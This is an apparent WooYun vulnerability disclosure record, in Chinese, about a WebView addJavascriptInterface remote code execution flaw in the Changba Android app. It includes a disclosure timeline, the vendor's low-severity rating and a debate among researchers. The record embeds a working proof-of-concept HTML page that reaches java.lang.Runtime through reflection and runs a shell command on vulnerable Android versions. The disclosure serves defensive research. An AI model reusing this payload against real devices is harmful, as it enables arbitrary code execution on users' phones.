{"id": 84837, "wybug_id": "wooyun-2015-0140708", "wybug_title": "唱吧android app中存在webview远程执行漏洞", "wybug_corp": "Changba-inc", "wybug_author": "niky1235", "wybug_date": "2015-09-14 15:43", "wybug_open_date": "2015-12-14 11:14", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-14：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-18：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向公众公开  简要描述： 存在webview远程执行漏洞 详细说明：  app内部多处使用了WebView 组件中的addJavascriptInterface 方法，当android4.2以下版本用户打开恶意链接时，可导致可任意执行远程代码。此app中还支持评论模式，在评论中如果存在这样恶意的链接，中招的用户会很多。   漏洞证明：  http://**.**.**.**/lucky/check_tools.html\n<html><head><meta charset=\"utf-8\"><!--[if lte IE 6]></base><![endif]--><title>hello changba</title><script type=\"text/javascript\">function check(){\tfor (var obj in window) \t{\t\ttry {\t\t\tif (\"getClass\" in window[obj]) {\t\t\t\ttry{window[obj].getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec([\"/system/bin/sh\", \"-c\", \"touch /mnt/sdcard/created_by_changba\"]);       \t\t\t\t\tbreak;\t\t\t\t}catch(e){\t\t\t\t}\t\t\t\t}\t\t} catch(e) {\t\t}\t}}</script></head><body onload=\"check();\"></body></html>\n\n\n\n\n\n\n   修复方案：  http://**.**.**.**/papers/548http://**.**.**.**/blog.htm?id=48   版权声明：转载请注明来源 niky1235@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-09-15 11:13 厂商回复： 不会伤及唱吧数据，但是对用户比较重要，谢谢提示出来，我们会尽快改进！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2015-09-15 14:15 |    \t\tniky1235 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | i'm niky!)\t\t \n  我真是醉了，这个危害等级是低。。结合你们那app里面一堆的权限，啥事不能干？不影响自身app的数据就没关系，用户嘛，就无所谓了，是这意思吗？！    \n     2015-11-09 12:03 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1868 漏洞数:275        | 出一份微不足道的\"力\")\t\t \n  @niky1235 你没理解 这个问题在现在已经不像之前那么严重了,JS注入进去 其实APP再怎么防御也没办法,你系统问题摆在那,没办法,就是360的一些app也是一样,只能通过升级系统或者使用防护软件(前提root) 深层打补丁就可以解决。    \n     2015-11-11 11:44 |    \t\tniky1235 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | i'm niky!)\t\t \n  @mango js为什么会被注入进去?第一层防护没把好关吧，不能出了问题就懒系统。唱吧现在的版本修复了这个问题，证明app自身还是可以做到防护这个问题的。当然这个问题是老问题了。    \n     2015-11-11 13:10 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1868 漏洞数:275        | 出一份微不足道的\"力\")\t\t \n  安卓APP在编译设置targetSdkVersion大于等于17，minSdkVersion小于17时，手机系统会根据SdkVersion使用相应的api。targetsdkversion大于等于17的安卓app，在安卓4.2系统和4.2以上的系统（sdk≥17），安卓app会使用sdkversion大于等于17的api，因此不存在CVE-2012-6636漏洞。在安卓4.2以下系统（sdk<17），安卓app只能使用sdkversion小于17的api，因此存在cve-2012-6636漏洞，该漏洞属于手机系统漏洞，影响该系统上的所有应用，安卓app无法彻底修复，只能进行缓解性的安全加固。漏洞参考：https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-6636    \n     2015-11-11 13:18 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1868 漏洞数:275        | 出一份微不足道的\"力\")\t\t \n  @niky1235 同样的APP装在4.4就不会有问题 是吧·    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}